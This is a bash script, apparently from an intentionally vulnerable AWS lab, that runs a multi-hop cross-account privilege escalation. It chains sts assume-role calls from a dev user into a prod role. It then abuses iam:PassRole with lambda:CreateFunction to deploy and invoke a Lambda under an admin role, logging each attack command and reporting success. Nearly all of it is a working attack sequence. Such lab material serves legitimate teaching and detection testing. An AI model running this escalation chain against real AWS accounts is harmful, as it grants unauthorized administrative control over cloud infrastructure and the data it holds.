#!/bin/bash

# Cross-Account PassRole to Lambda Admin Attack Demo
# This script demonstrates multi-hop cross-account privilege escalation via PassRole to Lambda admin
# Path: pl-pathfinding-starting-user-dev -> pl-lambda-prod-updater -> pl-lambda-updater -> pl-Lambda-admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${BLUE}=== Cross-Account PassRole to Lambda Admin Attack Demo ===${NC}"
echo "Attack path: pl-pathfinding-starting-user-dev"
echo "  -> pl-lambda-prod-updater (dev) -> pl-lambda-updater (prod)"
echo "  -> iam:PassRole + lambda:CreateFunction -> admin access"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if we have the required profile
if ! aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev &> /dev/null; then
    echo -e "${RED}Error: AWS profile 'pl-pathfinding-starting-user-dev' not found${NC}"
    echo "Please configure the profile first."
    exit 1
fi

# Retrieve readonly credentials for observation steps
cd ../../../../../..  # Navigate to root of terraform project
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
cd - > /dev/null

# Credential switching helpers
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
echo ""

# [EXPLOIT] Step 1: Assume the dev lambda-prod-updater role
echo -e "${YELLOW}Step 1: Assuming dev lambda-prod-updater role${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text"
DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"

echo "Assuming role: $DEV_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn \"$DEV_ROLE_ARN\" --role-session-name \"lambda-prod-updater-session\" --output json"
DEV_TEMP_CREDS=$(aws sts assume-role \
    --profile pl-pathfinding-starting-user-dev \
    --role-arn "$DEV_ROLE_ARN" \
    --role-session-name "lambda-prod-updater-session" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to assume dev lambda-prod-updater role${NC}"
    exit 1
fi

# Extract assumed-role credentials (do NOT replace with helper - these are session token creds)
export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION="us-west-2"

echo -e "${GREEN}✓ Successfully assumed dev lambda-prod-updater role${NC}"
echo ""

# [OBSERVATION] Step 2a: Get prod account ID using readonly creds
echo -e "${YELLOW}Step 2: Getting prod account ID and assuming prod lambda-updater role${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
PROD_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-lambda-updater"

echo "Found prod account: $PROD_ACCOUNT_ID"

# [EXPLOIT] Step 2b: Assume the prod lambda-updater role using dev role credentials
# Re-activate dev assumed-role credentials before cross-account assume-role
export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')

echo "Assuming role: $PROD_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$PROD_ROLE_ARN\" --role-session-name \"lambda-updater-prod-session\" --output json"
PROD_TEMP_CREDS=$(aws sts assume-role \
    --role-arn "$PROD_ROLE_ARN" \
    --role-session-name "lambda-updater-prod-session" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to assume prod lambda-updater role${NC}"
    exit 1
fi

# Extract prod assumed-role credentials (do NOT replace with helper - these are session token creds)
export AWS_ACCESS_KEY_ID=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed prod lambda-updater role${NC}"

# [EXPLOIT] Step 3: PassRole privilege escalation - create Lambda with admin role
echo ""
echo -e "${YELLOW}Step 3: PassRole privilege escalation - creating Lambda with admin role${NC}"
echo "The lambda-updater role has iam:PassRole permission."
echo "We can now create a Lambda function that uses the Lambda-admin role."

# Create a simple Lambda function that uses the admin role
echo "Creating a Lambda function with admin role..."

# Create a simple Python function (Python runtime has boto3 built-in)
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    try:
        # Create IAM client to demonstrate admin access
        iam = boto3.client('iam')

        # List all users to demonstrate admin access
        response = iam.list_users()
        users = response.get('Users', [])

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Lambda function executed with admin privileges!',
                'userCount': len(users),
                'users': [user['UserName'] for user in users]
            })
        }
    except Exception as error:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(error)
            })
        }
EOF

# Create a zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py

# Get the Lambda admin role ARN
LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-Lambda-admin"
echo "Using Lambda admin role: $LAMBDA_ADMIN_ROLE_ARN"

# Create the Lambda function
show_attack_cmd "Attacker" "aws lambda create-function --function-name "pl-privesc-demo-\$(date +%s)" --runtime "python3.9" --role "$LAMBDA_ADMIN_ROLE_ARN" --handler "lambda_function.lambda_handler" --zip-file "fileb://lambda_function.zip" --output json"
LAMBDA_RESULT=$(aws lambda create-function \
    --function-name "pl-privesc-demo-$(date +%s)" \
    --runtime "python3.9" \
    --role "$LAMBDA_ADMIN_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb://lambda_function.zip" \
    --output json)

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created Lambda function with admin role! Waiting for 5 seconds...${NC}"
    FUNCTION_NAME=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionName')
    echo "Function name: $FUNCTION_NAME"

    # Sleep for 5 seconds to allow Lambda to initialize
    sleep 5

    # [EXPLOIT] Step 4: Invoke the Lambda function to demonstrate admin access
    echo ""
    echo -e "${YELLOW}Step 4: Invoking Lambda function to demonstrate admin access${NC}"

    show_attack_cmd "Attacker" "aws lambda invoke --function-name \"$FUNCTION_NAME\" --payload '{}' /tmp/lambda_response.json --output json"
    INVOKE_RESULT=$(aws lambda invoke \
        --function-name "$FUNCTION_NAME" \
        --payload '{}' \
        /tmp/lambda_response.json \
        --output json)

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓ Lambda function invocation completed${NC}"
        echo "Response:"
        cat /tmp/lambda_response.json | jq '.'
        echo ""

        # Check if the function returned an error
        if cat /tmp/lambda_response.json | jq -e '.errorType' > /dev/null 2>&1; then
            echo -e "${RED}Error: Lambda function executed but there was an error${NC}"
            ERROR_TYPE=$(cat /tmp/lambda_response.json | jq -r '.errorType')
            ERROR_MESSAGE=$(cat /tmp/lambda_response.json | jq -r '.errorMessage')
            echo "Error Type: $ERROR_TYPE"
            echo "Error Message: $ERROR_MESSAGE"
            ATTACK_SUCCESS=false
        # Check if the function returned the success message (indicating admin access)
        elif cat /tmp/lambda_response.json | grep -q "Lambda function executed with admin privileges!"; then
            echo "✅ SUCCESS: Lambda function has admin access!"
            echo "The function was able to list IAM users, proving admin privileges."
            ATTACK_SUCCESS=true
        else
            echo "❌ Lambda function executed but did not demonstrate admin access"
            echo "Expected success message not found in response"
            ATTACK_SUCCESS=false
        fi

    else
        echo "❌ Failed to invoke Lambda function"
        ATTACK_SUCCESS=false
    fi


else
    echo -e "${RED}Error: Failed to create Lambda function with admin role${NC}"
    echo "This could be because:"
    echo "1. The lambda-updater role doesn't have iam:PassRole permission"
    echo "2. The Lambda-admin role doesn't exist or isn't properly configured"
    echo "3. There are other policy restrictions"
    exit 1
fi

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda_response.json

# Unset the environment variables
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
if [ "$ATTACK_SUCCESS" = "true" ]; then
    echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
    echo "The attack successfully demonstrated multi-hop privilege escalation:"
    echo "1. Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
    echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
    echo "3. Used iam:PassRole permission to create Lambda with admin role"
    echo "4. Lambda function executed with full admin privileges"
    echo "5. Confirmed admin access by listing IAM users"
    echo ""
    echo "⚠️  This demonstrates a critical multi-hop cross-account privilege escalation vulnerability!"

    # Output standardized test results
    echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:SUCCESS"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Successfully demonstrated multi-hop cross-account PassRole privilege escalation to Lambda admin"
    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=true"
else
    echo "❌ ATTACK FAILED!"
    echo "=================="
    echo "The attack partially succeeded but failed to achieve admin privileges:"
    echo "1. ✅ Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
    echo "2. ✅ Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
    echo "3. ✅ Used iam:PassRole permission to create Lambda with admin role"
    echo "4. ❌ Lambda function execution failed or did not demonstrate admin privileges"
    echo ""
    echo "The Lambda function was created successfully but failed to execute properly or demonstrate admin access."

    # Output standardized test results
    echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:FAILURE"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Lambda function created but failed to demonstrate admin access"
    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=false"
    exit 1
fi

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
